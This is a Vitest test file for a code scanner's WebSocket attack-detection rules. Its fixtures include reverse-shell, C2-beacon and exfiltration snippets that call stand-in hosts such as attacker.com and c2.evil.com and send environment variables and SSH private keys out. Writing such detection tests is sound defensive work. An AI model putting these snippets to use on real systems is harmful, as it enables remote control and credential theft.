/**
 * Tests for WebSocket-based attack detection patterns
 * Covers: C2 channels, data exfiltration, reverse shells, command execution
 */

import { describe, it, expect } from 'vitest';
import { analyzeContent } from '../src/analyzer.js';

describe('WebSocket Scanner Rules', () => {
  describe('WS_SUSPICIOUS_CONNECT - Suspicious WebSocket connections', () => {
    it('detects WebSocket to suspicious endpoints', () => {
      const code = `const ws = new WebSocket('wss://evil-c2.example.com/connect');`;
      const result = analyzeContent(code);
      const findings = result.findings.filter(f => f.patternId === 'WS_SUSPICIOUS_CONNECT');
      expect(findings.length).toBeGreaterThanOrEqual(1);
    });

    it('detects WebSocket with dynamic URL', () => {
      const code = `const url = getServer(); const ws = new WebSocket(url);`;
      const result = analyzeContent(code);
      const findings = result.findings.filter(f => f.patternId === 'WS_SUSPICIOUS_CONNECT');
      expect(findings.length).toBeGreaterThanOrEqual(1);
    });

    it('allows WebSocket to safe domains', () => {
      const code = `const ws = new WebSocket('wss://api.github.com/ws');`;
      const result = analyzeContent(code);
      const wsFindings = result.findings.filter(f => f.patternId.startsWith('WS_'));
      expect(wsFindings.length).toBe(0);
    });

    it('allows WebSocket to localhost', () => {
      const code = `const ws = new WebSocket('ws://localhost:3000');`;
      const result = analyzeContent(code);
      const wsFindings = result.findings.filter(f => f.patternId.startsWith('WS_'));
      expect(wsFindings.length).toBe(0);
    });
  });

  describe('WS_DATA_EXFIL - WebSocket data exfiltration', () => {
    it('detects sending env vars over WebSocket', () => {
      const code = `ws.send(JSON.stringify(process.env));`;
      const result = analyzeContent(code);
      const findings = result.findings.filter(f => f.patternId === 'WS_DATA_EXFIL');
      expect(findings.length).toBeGreaterThanOrEqual(1);
    });

    it('detects sending tokens over WebSocket', () => {
      const code = `ws.send('token=' + apiKey);`;
      const result = analyzeContent(code);
      const findings = result.findings.filter(f => f.patternId === 'WS_DATA_EXFIL');
      expect(findings.length).toBeGreaterThanOrEqual(1);
    });

    it('detects sending passwords over WebSocket', () => {
      const code = `ws.send(auth.password);`;
      const result = analyzeContent(code);
      const findings = result.findings.filter(f => f.patternId === 'WS_DATA_EXFIL');
      expect(findings.length).toBeGreaterThanOrEqual(1);
    });

    it('allows normal WebSocket messages', () => {
      const code = `ws.send(JSON.stringify({ type: 'ping' }));`;
      const result = analyzeContent(code);
      const findings = result.findings.filter(f => f.patternId === 'WS_DATA_EXFIL');
      expect(findings.length).toBe(0);
    });
  });

  describe('WS_REVERSE_SHELL - WebSocket reverse shell', () => {
    it('detects WebSocket + child_process combination', () => {
      const code = `
        const WebSocket = require('ws');
        const { exec } = require('child_process');
        const ws = new WebSocket('wss://attacker.com/shell');
        ws.on('message', (cmd) => exec(cmd.toString()));
      `;
      const result = analyzeContent(code);
      const findings = result.findings.filter(f => f.patternId.startsWith('WS_'));
      expect(findings.length).toBeGreaterThanOrEqual(1);
    });

    it('detects reverse shell with spawn', () => {
      const code = `
        const ws = new WebSocket('wss://c2.evil.com');
        const { spawn } = require('child_process');
        ws.on('message', msg => {
          const child = spawn(msg.toString(), { shell: true });
          child.stdout.on('data', data => ws.send(data));
        });
      `;
      const result = analyzeContent(code);
      const findings = result.findings.filter(f => f.patternId.startsWith('WS_'));
      expect(findings.length).toBeGreaterThanOrEqual(1);
    });
  });

  describe('WS_PERSISTENT_C2 - Persistent C2 channel', () => {
    it('detects reconnection loop', () => {
      const code = `
        function connect() {
          const ws = new WebSocket('wss://c2.evil.com');
          ws.onclose = () => setTimeout(connect, 5000);
          setInterval(() => ws.send('alive'), 30000);
        }
      `;
      const result = analyzeContent(code);
      const findings = result.findings.filter(f => f.patternId.startsWith('WS_'));
      expect(findings.length).toBeGreaterThanOrEqual(1);
    });
  });

  describe('WS_COMMAND_EXEC - Command execution via WebSocket', () => {
    it('detects eval over WebSocket', () => {
      const code = `ws.on('message', data => eval(data.toString()));`;
      const result = analyzeContent(code);
      const findings = result.findings.filter(f => f.patternId === 'WS_COMMAND_EXEC');
      expect(findings.length).toBeGreaterThanOrEqual(1);
    });

    it('detects exec via WebSocket message handler', () => {
      const code = `socket.on("message", msg => require("child_process").exec(msg));`;
      const result = analyzeContent(code);
      const findings = result.findings.filter(f => f.patternId === 'WS_COMMAND_EXEC');
      expect(findings.length).toBeGreaterThanOrEqual(1);
    });
  });

  describe('Integration - realistic attack scenarios', () => {
    it('detects a realistic WebSocket reverse shell', () => {
      const code = `
        const WebSocket = require('ws');
        const { exec } = require('child_process');
        const ws = new WebSocket('wss://attacker.example.com:8443/shell');
        
        ws.on('open', () => {
          ws.send(JSON.stringify(process.env));
        });
        
        ws.on('message', (cmd) => {
          exec(cmd.toString(), (err, stdout, stderr) => {
            ws.send(stdout + stderr);
          });
        });
        
        ws.on('close', () => {
          setTimeout(() => {
            ws.reconnect();
          }, 5000);
        });
      `;
      const result = analyzeContent(code);
      expect(result.riskLevel).toMatch(/critical|high/);
      const wsFindings = result.findings.filter(f => f.patternId.startsWith('WS_'));
      expect(wsFindings.length).toBeGreaterThanOrEqual(3);
    });

    it('detects WebSocket C2 with data exfiltration', () => {
      const code = `
        const ws = new WebSocket('wss://malicious-c2.xyz/beacon');
        
        const exfil = () => {
          const data = {
            env: process.env,
            files: readAllFiles(),
            tokens: readFileSync('~/.ssh/id_rsa')
          };
          ws.send(JSON.stringify(data));
        };
        
        setInterval(exfil, 60000);
        ws.onclose = () => setTimeout(exfil, 10000);
      `;
      const result = analyzeContent(code);
      expect(result.riskLevel).toMatch(/critical|high/);
    });
  });
});
